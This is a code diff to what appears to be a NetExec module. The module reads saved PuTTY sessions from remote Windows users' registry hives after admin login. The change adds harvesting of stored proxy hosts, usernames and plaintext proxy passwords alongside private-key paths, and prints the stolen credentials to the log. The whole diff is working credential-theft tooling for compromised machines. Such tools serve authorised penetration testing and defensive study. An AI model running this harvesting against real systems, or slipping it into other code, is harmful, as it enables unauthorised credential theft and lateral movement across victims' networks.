@@ -114,13 +114,32 @@ class NXCModule:
                 # Extract stored Session infos
                 for session_name in session_names:
                     key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"{user}\\Software\\SimonTatham\\PuTTY\\Sessions\\{session_name}")["phkResult"]
+
+                    # Get private Key Path
                     private_key_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "PublicKeyFile")[1].split("\x00")[:-1][0]
+                    proxy_host = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyHost")[1].split("\x00")[:-1][0]
+                    proxy_port = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyPort")[1]
+                    proxy_username = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyUsername")[1].split("\x00")[:-1][0]
+                    proxy_password = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyPassword")[1].split("\x00")[:-1][0]
+
+                    # Session infos
                     hostname = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "HostName")[1].split("\x00")[:-1][0]
                     port = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "PortNumber")[1]
                     protocol = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "Protocol")[1].split("\x00")[:-1][0]
-                    sessions.append({"user": self.user_dict[user], "session_name": unquote(session_name), "private_key_path": private_key_path, "hostname": hostname, "port": port, "protocol": protocol})
+                    sessions.append({
+                        "user": self.user_dict[user],
+                        "session_name": unquote(session_name),
+                        "hostname": hostname,
+                        "port": port,
+                        "protocol": protocol,
+                        "private_key_path": private_key_path,
+                        "proxy_host": proxy_host,
+                        "proxy_port": proxy_port,
+                        "proxy_username": proxy_username,
+                        "proxy_password": proxy_password
+                    })
                     rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
-                
+
             except DCERPCException as e:
                 if str(e).find("ERROR_FILE_NOT_FOUND"):
                     self.context.log.debug(f"No PuTTY session config found in registry for user {self.user_dict[user]}")
@@ -128,8 +147,8 @@ class NXCModule:
                 self.context.log.fail(f"Unexpected error: {e}")
                 self.context.log.debug(traceback.format_exc())
         return sessions
-    
-    def extract_private_keys(self, sessions):
+
+    def extract_session(self, sessions):
         for session in sessions:
             if session["private_key_path"]:
                 makedirs(f"{NXC_PATH}/modules/PuTTY", exist_ok=True)
@@ -152,6 +171,14 @@ class NXCModule:
                 self.context.log.highlight(f"Sessionname: {session['session_name']}")
                 self.context.log.highlight(f"Host: {session['hostname']}:{session['port']}")
                 self.context.log.highlight(f"Protocol: {session['protocol']}")
+            if session["proxy_password"]:
+                self.context.log.success(f"Found proxy credentials for user \"{session['user']}\"")
+                self.context.log.highlight(f"Sessionname: {session['session_name']}")
+                self.context.log.highlight(f"Host: {session['hostname']}:{session['port']}")
+                self.context.log.highlight(f"Protocol: {session['protocol']}")
+                self.context.log.highlight(f"Proxy Host: {session['proxy_host']}:{session['proxy_port']}")
+                self.context.log.highlight(f"Proxy Username: {session['proxy_username']}")
+                self.context.log.highlight(f"Proxy Password: {session['proxy_password']}")
 
     def on_admin_login(self, context, connection):
         self.connection = connection
@@ -171,7 +198,7 @@ class NXCModule:
 
             sessions = self.get_private_key_paths(all_users)
             if sessions:
-                self.extract_private_keys(sessions)
+                self.extract_session(sessions)
             else:
                 self.context.log.info("No saved putty sessions found in registry")
 
